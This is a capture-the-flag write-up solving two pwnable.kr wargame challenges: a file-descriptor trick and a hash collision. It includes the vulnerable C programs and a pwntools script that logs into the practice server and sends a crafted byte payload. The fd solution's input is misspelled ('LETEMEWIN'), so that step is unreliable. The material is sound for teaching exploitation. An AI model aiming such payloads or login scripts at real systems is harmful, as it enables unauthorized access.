# Solutions to Toddler's Bottle

## fd
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	int fd = atoi( argv[1] ) - 0x1234;
	int len = 0;
	len = read(fd, buf, 32);
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;

}
```
0x1234 = 4660, 0 is fd for stdin
```bash
fd@pwnable:~$ ./fd 4660
LETEMEWIN
```
<hr>

## collision
#### Problem's code:
```c
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
	int* ip = (int*)p;
	int i;
	int res=0;
	for(i=0; i<5; i++){
		res += ip[i];
	}
	return res;
}

int main(int argc, char* argv[]){
	if(argc<2){
		printf("usage : %s [passcode]\n", argv[0]);
		return 0;
	}
	if(strlen(argv[1]) != 20){
		printf("passcode length should be 20 bytes\n");
		return 0;
	}

	if(hashcode == check_password( argv[1] )){
		system("/bin/cat flag");
		return 0;
	}
	else
		printf("wrong passcode.\n");
	return 0;
}
```
#### Solution's script:
```python
from pwn import *

def read_lines(p, count, decode = True):
    lines = []
    for _ in range(count):
        lines.append(p.recvline().decode('utf8', errors='replace') if decode else p.recvline())
    print("\n".join(lines))

r = ssh(user="col", host="pwnable.kr", password="guest", port=2222)
payload = b"/home/col/col " + b"\x7A\x41\x76\x07" * 4 + b"\x04\x04\x04\x04" # 776417A * 4 + 4040404 = 0x21DD09EC (consider little-endian)
p = r.run(payload)
read_lines(p, 1)

p.interactive()
```



